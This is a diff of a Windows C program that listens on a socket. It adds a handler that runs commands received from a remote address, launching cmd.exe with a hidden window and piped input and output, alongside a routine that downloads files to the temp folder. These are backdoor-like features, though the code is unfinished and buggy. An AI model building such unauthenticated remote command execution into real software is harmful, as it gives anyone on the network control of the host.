@@ -27,7 +27,7 @@ INT InitNetwork()
 		return INVALID_SOCKET;
 	}
 
-	int error = WSAGetLastError();
+	//int error = WSAGetLastError();
 
 	SOCKADDR_IN BindAddress;
 	ZeroMemory(&BindAddress, sizeof(BindAddress));
@@ -38,12 +38,11 @@ INT InitNetwork()
 	iResult = bind(Sock, (const sockaddr*)&BindAddress, sizeof(BindAddress));
 	if (iResult != 0)
 	{
+		//int error2 = WSAGetLastError();
 		closesocket(Sock);
 		WSACleanup();
 		return INVALID_SOCKET;
 	}
-
-	int error2 = WSAGetLastError();
 
 	return Sock;
 }
@@ -133,7 +132,23 @@ VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddr
 	}
 	else if (lstrcmp(szType, TEXT("#Exe#")) == 0)
 	{
-		
+		LPTSTR UnicodeIpAddr = ANSIToUnicode(inet_ntoa(fromAddress));
+		wsprintf(szDisplayBufferB, TEXT("%s[%s]\r\nExecuting: %s\r\n"), szDisplayBuffer,
+			UnicodeIpAddr, szBuffer);
+		free(UnicodeIpAddr);
+		SetWindowText(hOutput, szDisplayBufferB);
+
+		if (ExecuteCommand(hOutput, szBuffer) == TRUE)
+		{
+			wsprintf(szDisplayBuffer,
+				TEXT("%sExecute Success!\r\n"), szDisplayBufferB);
+		}
+		else
+		{
+			wsprintf(szDisplayBuffer,
+				TEXT("%sExecute Fail!\r\n"), szDisplayBufferB);
+		}
+		SetWindowText(hOutput, szDisplayBuffer);
 	}
 	else
 	{
@@ -158,15 +173,61 @@ VOID CleanNetwork(INT Sock)
 	WSACleanup();
 }
 
-VOID ExecuteCommand(HWND hOutput, const LPTSTR lpCmdLine)
+BOOL ExecuteCommand(HWND hOutput, const LPTSTR lpCmdLine)
 {
-	
+	HANDLE hStdinRead, hStdinWrite,
+		hStdoutRead, hStdoutWrite;
+
+	SECURITY_ATTRIBUTES sa;
+	ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
+	sa.nLength = sizeof(sa);
+	sa.bInheritHandle = TRUE;
+	sa.lpSecurityDescriptor = NULL;
+
+	BOOL bResult;
+	bResult = CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0);
+	if (bResult == 0)
+	{
+		return FALSE;
+	}
+	bResult = CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0);
+	if (bResult == 0)
+	{
+		return FALSE;
+	}
+
+	STARTUPINFO StartInfo;
+	ZeroMemory(&StartInfo, sizeof(StartInfo));
+	StartInfo.cb = sizeof(StartInfo);
+	StartInfo.hStdInput = hStdinRead;
+	StartInfo.hStdOutput = hStdoutWrite;
+	StartInfo.hStdError = hStdoutWrite;
+	StartInfo.wShowWindow = SW_HIDE;
+	StartInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+
+	PROCESS_INFORMATION ProcessInfo;
+	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
+	TCHAR szCmdPath[MAX_PATH] = { 0 };
+	GetSystemDirectory(szCmdPath, MAX_PATH);
+	lstrcat(szCmdPath, TEXT("\\cmd.exe"));
+
+	CreateProcess(NULL, szCmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartInfo, &ProcessInfo);
+
+
+	Sleep(1000);
+	DWORD dActualRead = 0;
+	CHAR szBuffer[1024] = { 0 };
+	ReadFile(hStdoutRead, szBuffer, 1024, &dActualRead, NULL);
+
+	MessageBoxA(NULL, szBuffer, 0, 0);
+
+	return TRUE;
 }
 
 BOOL DownloadFile(const LPTSTR lpCmdLine, LPTSTR szSavePath)
 {
 	TCHAR szFullPath[MAX_PATH] = { 0 };
-	LPTSTR szFileName = ParseFilenameFromUrl(lpCmdLine);
+	LPTSTR szFileName = GetFilenameFromUrl(lpCmdLine);
 
 	GetTempPath(MAX_PATH, szFullPath);
 	lstrcat(szFullPath, szFileName);
@@ -184,7 +245,7 @@ BOOL DownloadFile(const LPTSTR lpCmdLine, LPTSTR szSavePath)
 	}
 }
 
-LPTSTR ParseFilenameFromUrl(const LPTSTR szUrl)
+LPTSTR GetFilenameFromUrl(const LPTSTR szUrl)
 {
 	TCHAR *szFileName = 
 		(TCHAR *)LocalAlloc(LMEM_ZEROINIT, sizeof(TCHAR)*MAX_PATH);
